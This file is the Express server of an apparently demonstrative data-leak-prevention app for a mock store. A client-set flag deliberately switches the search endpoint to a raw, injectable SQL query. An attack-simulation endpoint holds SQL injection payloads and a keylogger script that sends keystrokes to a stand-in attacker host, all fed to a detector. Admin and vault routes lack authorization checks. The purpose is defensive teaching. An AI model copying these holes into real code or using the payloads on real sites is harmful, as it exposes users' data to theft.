/**
 * Main Server - Detecting Data Leaks Using SQL & Cloud DLP Architecture
 * Powered by Express, Native Node SQLite, and AESX Cryptography
 */

const express = require('express');
const path = require('node:path');
const db = require('./src/db/database');
const aesx = require('./src/crypto/aesx');
const dlp = require('./src/dlp/dlpCore');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Simple in-memory session token store for demo
const activeAuthTokens = new Map();

// Authentication middleware (extracts user if token present)
app.use((req, res, next) => {
  const authHeader = req.headers['authorization'];
  if (authHeader && authHeader.startsWith('Bearer ')) {
    const token = authHeader.substring(7);
    if (activeAuthTokens.has(token)) {
      req.user = activeAuthTokens.get(token);
    }
  }
  next();
});

// ==========================================
// 1. E-COMMERCE & STOREFRONT API ENDPOINTS
// ==========================================

// Get product catalog
app.get('/api/products', (req, res) => {
  try {
    const products = db.searchProductsSafe('');
    res.json({ success: true, products });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Search products (with DLP Content Inspection & Contextual Analysis)
app.post('/api/products/search', (req, res) => {
  const { query = '', bypassDlp = false, typingSpeedMs = null } = req.body;

  // Run through DLP Gateway
  const dlpResult = dlp.processDlpInspection(req, query, 'SQL_SEARCH', { typingSpeedMs });

  // If DLP blocks the request or assaulter honeypot is served
  if (!bypassDlp && dlpResult.shouldBlock) {
    if (dlpResult.serveHoneytoken) {
      // Return deceptive honeypot records
      const decoys = db.getHoneytokens();
      return res.status(200).json({
        success: true,
        isHoneypot: true,
        message: 'Query executed (Honeypot Sandbox Active)',
        products: decoys.map(d => ({
          id: 9999,
          name: `[RESTRICTED VAULT] ${d.name}`,
          category: 'CONFIDENTIAL',
          price: 999999.00,
          stock: 1,
          rating: 5.0,
          description: `Internal decoy: ${d.email} | Card: ${d.creditCard} | ${d.warning}`,
          image_url: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=500&auto=format&fit=crop&q=60'
        })),
        dlpResult
      });
    }

    return res.status(403).json({
      success: false,
      blocked: true,
      error: 'DLP Security Alert: Your query has triggered threat mitigation rules and was blocked.',
      dlpResult
    });
  }

  // If DLP bypass is intentionally checked for demonstration
  if (bypassDlp) {
    try {
      // Intentionally execute raw query for vulnerability demonstration
      const rawSql = `SELECT * FROM products WHERE name LIKE '%${query}%' OR category LIKE '%${query}%'`;
      const rawResults = db.executeRawQuery(rawSql);
      return res.json({
        success: true,
        bypassedDlp: true,
        queryExecuted: rawSql,
        products: rawResults,
        dlpResult
      });
    } catch (err) {
      // Record contextual query error
      dlp.contextualEngine.evaluateContext(req.user ? req.user.username : 'guest', { isError: true });
      return res.status(500).json({
        success: false,
        error: `Database SQL Syntax Error: ${err.message}`,
        dlpResult
      });
    }
  }

  // Safe Parameterized Execution with DLP
  try {
    const products = db.searchProductsSafe(query);
    res.json({
      success: true,
      products,
      dlpResult
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// User Login (Checks for SQLi Auth Bypass & Keystroke Anomaly)
app.post('/api/auth/login', (req, res) => {
  const { username = '', password = '', typingCadenceMs = null } = req.body;

  // Run DLP inspection on login credentials
  const loginPayload = `${username} ${password}`;
  const dlpResult = dlp.processDlpInspection(req, loginPayload, 'AUTH_LOGIN', {
    typingSpeedMs: typingCadenceMs,
    payloadLength: loginPayload.length
  });

  if (dlpResult.shouldBlock) {
    return res.status(403).json({
      success: false,
      error: 'Security Alert: Suspicious login activity or SQLi bypass pattern detected.',
      dlpResult
    });
  }

  const user = db.getUserByUsername(username);
  if (!user) {
    return res.status(401).json({
      success: false,
      error: 'Invalid credentials',
      dlpResult
    });
  }

  if (user.status === 'restricted' || user.status === 'blocked') {
    return res.status(403).json({
      success: false,
      error: `Account is currently ${user.status.toUpperCase()} by the DLP Security Engine due to prior malicious behavior.`,
      userCategory: user.category
    });
  }

  if (!aesx.verifyPassword(password, user.password_hash)) {
    return res.status(401).json({
      success: false,
      error: 'Invalid credentials',
      dlpResult
    });
  }

  // Generate auth token
  const token = 'token_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
  activeAuthTokens.set(token, user);

  const profile = db.getUserProfile(user.id, true);

  res.json({
    success: true,
    token,
    user: {
      id: user.id,
      username: user.username,
      email: user.email,
      role: user.role,
      status: user.status,
      category: user.category,
      riskScore: user.risk_score
    },
    profile,
    dlpResult
  });
});

// User Registration with AESX Field-Level Encryption
app.post('/api/auth/register', (req, res) => {
  const { username, email, password, fullName, phone, address, creditCard } = req.body;

  if (!username || !email || !password || !fullName) {
    return res.status(400).json({ success: false, error: 'Missing required registration fields' });
  }

  // Inspect registration payload for malicious code
  const dlpResult = dlp.processDlpInspection(req, `${username} ${fullName} ${address}`, 'AUTH_REGISTER');
  if (dlpResult.shouldBlock) {
    return res.status(403).json({
      success: false,
      error: 'Registration rejected: Potentially hazardous payload identified.',
      dlpResult
    });
  }

  try {
    const passwordHash = aesx.hashPassword(password);
    const insertUser = db.db.prepare(`
      INSERT INTO users (username, email, password_hash, role, status, risk_score, category)
      VALUES (?, ?, ?, 'customer', 'active', 0, 'Benign')
    `);
    const userRes = insertUser.run(username, email, passwordHash);
    const userId = userRes.lastInsertRowid;

    // Encrypt sensitive PII using AESX before writing to SQL
    const phoneEncrypted = aesx.encrypt(phone || '+1 (555) 000-0000');
    const addressEncrypted = aesx.encrypt(address || '123 Cloud Way');
    const cardToStore = creditCard || '4000123456789010';
    const cardEncrypted = aesx.encrypt(cardToStore);
    const last4 = cardToStore.slice(-4);

    const insertProfile = db.db.prepare(`
      INSERT INTO customer_profiles (user_id, full_name, phone_encrypted, address_encrypted, credit_card_encrypted, credit_card_last4, balance)
      VALUES (?, ?, ?, ?, ?, ?, 1000.00)
    `);
    insertProfile.run(userId, fullName, phoneEncrypted, addressEncrypted, cardEncrypted, last4);

    res.json({
      success: true,
      message: 'Account created with AESX field encryption active',
      userId
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Checkout with AESX Encrypted Credit Card Transaction
app.post('/api/checkout', (req, res) => {
  const { items = [], totalAmount = 0, customerName = 'Guest', shippingAddress = '', cardNumber = '' } = req.body;

  // Inspect payment payload for anomalies
  const dlpResult = dlp.processDlpInspection(req, shippingAddress, 'CHECKOUT');
  if (dlpResult.shouldBlock) {
    return res.status(403).json({
      success: false,
      error: 'Transaction halted by DLP Shield',
      dlpResult
    });
  }

  const userId = req.user ? req.user.id : 1;
  const orderId = db.createOrder(userId, customerName, totalAmount, items, shippingAddress);

  // Return receipt with AESX encryption verification
  const encryptedAddressToken = aesx.encrypt(shippingAddress);

  res.json({
    success: true,
    orderId,
    totalAmount,
    encryptedShippingToken: encryptedAddressToken,
    cardMasked: aesx.maskValue(cardNumber, 'card'),
    message: 'Payment securely processed. Shipping details and card records stored using AESX encryption.'
  });
});

// Customer Service / Messaging Portal (Inspects for Data Leaks, PII, Keystroke/Ransomware payloads)
app.post('/api/messages/send', (req, res) => {
  const { message = '', username = 'Guest' } = req.body;
  const userId = req.user ? req.user.id : null;

  // Run DLP Content & Contextual Inspection on User Message
  const dlpResult = dlp.processDlpInspection(req, message, 'USER_CHAT');

  let inspectionStatus = dlpResult.contentReport.isThreat ? 'FLAGGED' : 'CLEAN';
  let threatLevel = dlpResult.contentReport.threatLevel;
  let leakIndicators = dlpResult.contentReport.matches.map(m => m.ruleName).join('; ');
  let actionTaken = dlpResult.finalAction;

  // Save message to database
  db.saveMessage(userId, username, message, inspectionStatus, threatLevel, leakIndicators, actionTaken);

  if (dlpResult.shouldBlock) {
    return res.status(403).json({
      success: false,
      blocked: true,
      error: 'DLP Security Alert: Your message contains prohibited data or security exploit patterns.',
      dlpResult
    });
  }

  res.json({
    success: true,
    message: 'Message delivered successfully.',
    sanitized: dlpResult.sanitizedPayload,
    dlpResult
  });
});

// Get recent messages
app.get('/api/messages', (req, res) => {
  try {
    const messages = db.getMessages(25);
    res.json({ success: true, messages });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ==========================================
// 2. DLP & SOC MONITORING API ENDPOINTS
// ==========================================

// SSE Stream for Real-Time Telemetry
app.get('/api/dlp/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  dlp.registerSseClient(res);

  // Send initial handshake
  res.write(`event: connected\ndata: ${JSON.stringify({ timestamp: new Date().toISOString() })}\n\n`);
});

// Get DLP SOC Statistics
app.get('/api/dlp/stats', (req, res) => {
  try {
    const totalIncidents = db.db.prepare('SELECT COUNT(*) as count FROM security_incidents').get().count;
    const criticalIncidents = db.db.prepare("SELECT COUNT(*) as count FROM security_incidents WHERE threat_level = 'CRITICAL'").get().count;
    const highIncidents = db.db.prepare("SELECT COUNT(*) as count FROM security_incidents WHERE threat_level = 'HIGH'").get().count;
    const blockedActions = db.db.prepare("SELECT COUNT(*) as count FROM security_incidents WHERE action_taken LIKE '%RESTRICT%' OR action_taken LIKE '%BLOCK%'").get().count;

    // User categories count
    const usersCount = db.db.prepare('SELECT category, COUNT(*) as count FROM users GROUP BY category').all();
    const userCategories = { Benign: 0, Suspicious: 0, Assaulter: 0 };
    for (const row of usersCount) {
      if (userCategories[row.category] !== undefined) {
        userCategories[row.category] = row.count;
      }
    }

    // Active session telemetry
    const activeSessions = dlp.contextualEngine.getAllSessions();

    res.json({
      success: true,
      stats: {
        totalIncidents,
        criticalIncidents,
        highIncidents,
        blockedActions,
        userCategories,
        activeSessionsCount: activeSessions.length,
        aesxKeyFingerprint: aesx.getKeyFingerprint()
      }
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Get Security Incident Log
app.get('/api/dlp/incidents', (req, res) => {
  try {
    const incidents = db.getIncidents(60);
    res.json({ success: true, incidents });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Get User Threat Categorization Directory
app.get('/api/dlp/users', (req, res) => {
  try {
    const users = db.db.prepare(`
      SELECT id, username, email, role, status, risk_score, category, created_at
      FROM users
      ORDER BY risk_score DESC, id ASC
    `).all();

    const inMemorySessions = dlp.contextualEngine.getAllSessions();

    res.json({
      success: true,
      users,
      activeSessions: inMemorySessions
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Admin action on user (Unban / Restrict / Reset)
app.post('/api/dlp/users/:id/action', (req, res) => {
  const userId = parseInt(req.params.id, 10);
  const { action } = req.body; // 'RESET' | 'RESTRICT' | 'BLOCK'

  const user = db.db.prepare('SELECT * FROM users WHERE id = ?').get(userId);
  if (!user) {
    return res.status(404).json({ success: false, error: 'User not found' });
  }

  if (action === 'RESET') {
    db.resetUserStatus(userId);
    dlp.contextualEngine.setUserStatus(user.username, 'active', 0);
  } else if (action === 'RESTRICT') {
    db.updateUserRisk(userId, 85, 'Assaulter', 'restricted');
    dlp.contextualEngine.setUserStatus(user.username, 'restricted', 85);
  } else if (action === 'BLOCK') {
    db.updateUserRisk(userId, 100, 'Assaulter', 'blocked');
    dlp.contextualEngine.setUserStatus(user.username, 'blocked', 100);
  }

  res.json({ success: true, message: `Action ${action} executed for user ${user.username}` });
});

// Interactive Payload Inspection Sandbox
app.post('/api/dlp/inspect-payload', (req, res) => {
  const { payload = '', context = 'GENERAL', simulateContextual = false } = req.body;

  const contentReport = dlp.inspectContent(payload, context);
  let contextualReport = null;

  if (simulateContextual) {
    contextualReport = dlp.contextualEngine.evaluateContext('sandbox_tester', {
      endpoint: '/api/dlp/inspect-payload',
      method: 'POST',
      payloadLength: payload.length
    }, contentReport);
  }

  res.json({
    success: true,
    contentReport,
    contextualReport,
    aesxSampleEncryption: aesx.encrypt(payload)
  });
});

// Get AESX Vault Explorer Profiles (Plaintext vs Encrypted)
app.get('/api/dlp/vault', (req, res) => {
  try {
    const vaultProfiles = db.getAllVaultProfiles();
    res.json({
      success: true,
      keyFingerprint: aesx.getKeyFingerprint(),
      algorithm: 'AES-256-GCM + Whitening (AESX)',
      vaultProfiles
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Test AES-GCM Ciphertext Tamper Resistance
app.post('/api/dlp/vault/tamper-test', (req, res) => {
  const { ciphertext } = req.body;
  const tokenToTest = ciphertext || aesx.encrypt('4532-9876-1234-5678');
  const result = aesx.testTamper(tokenToTest);
  res.json({ success: true, result });
});

// Attack Simulation Lab (Runs realistic simulated attack vectors)
app.post('/api/dlp/simulate-attack', (req, res) => {
  const { attackType } = req.body;
  let attackResult = {};

  switch (attackType) {
    case 'SQLI_AUTH_BYPASS': {
      // Classic Tautology Injection on Login
      const payload = "' OR '1'='1' --";
      const inspection = dlp.processDlpInspection(req, payload, 'AUTH_LOGIN');
      attackResult = {
        name: 'SQL Injection Authentication Bypass',
        vector: 'Tautology Filter Bypass in Login Credentials',
        payload,
        inspection
      };
      break;
    }
    case 'SQLI_UNION_EXFILTRATION': {
      // Union-based SQL injection attempting to exfiltrate credit cards
      const payload = "Titan' UNION SELECT id, username, credit_card_encrypted, null, null, null, null FROM customer_profiles --";
      const inspection = dlp.processDlpInspection(req, payload, 'SQL_SEARCH');
      attackResult = {
        name: 'SQL Union-Based Exfiltration Attack',
        vector: 'Multi-table Data Harvesting via Catalog Search Bar',
        payload,
        inspection
      };
      break;
    }
    case 'PII_MASS_LEAK': {
      // Attempting to transmit leaked credit card combo and SSNs in messages
      const payload = "Dumped customer records: Alice Smith SSN: 234-56-7890 Card: 4532718293847561 exp: 08/29 cvv: 482";
      const inspection = dlp.processDlpInspection(req, payload, 'USER_CHAT');
      attackResult = {
        name: 'PII & Financial Data Exfiltration',
        vector: 'Outbound Message Leakage containing valid Luhn Credit Cards and SSN',
        payload,
        inspection
      };
      break;
    }
    case 'KEYSTROKE_LOGGER_INJECTION': {
      // Malicious JavaScript keylogger injected into feedback/support form
      const payload = "<script>window.addEventListener('keypress', function(e){ fetch('http://assaulter-c2.cc/log?k=' + e.key); });</script>";
      const inspection = dlp.processDlpInspection(req, payload, 'USER_CHAT');
      attackResult = {
        name: 'Keystroke Logger Theft Injection',
        vector: 'Cross-Site Keystroke Interception Script Payload',
        payload,
        inspection
      };
      break;
    }
    case 'SCANNER_VELOCITY_BURST': {
      // 12 rapid queries in 1 second triggering contextual velocity anomaly
      const dummyPayload = "random_product_probe";
      let lastReport = null;
      for (let i = 0; i < 12; i++) {
        lastReport = dlp.processDlpInspection(req, `${dummyPayload}_${i}`, 'SQL_SEARCH');
      }
      attackResult = {
        name: 'Contextual Velocity & Scanner Bot Probe',
        vector: 'Automated High-Frequency Query Burst',
        payload: '12 rapid automated requests in < 1 second',
        inspection: lastReport
      };
      break;
    }
    default:
      return res.status(400).json({ success: false, error: 'Unknown attack type' });
  }

  res.json({
    success: true,
    attackResult
  });
});

// Fallback to index.html for SPA (Express 5 compatible)
app.use((req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start Server
app.listen(PORT, () => {
  console.log(`=======================================================`);
  console.log(` DLP Cloud Shield: Detecting Data Leaks Using SQL`);
  console.log(` Cryptographic Security: AESX (AES-256-GCM + Tagging)`);
  console.log(` Running on: http://localhost:${PORT}`);
  console.log(`=======================================================`);
});
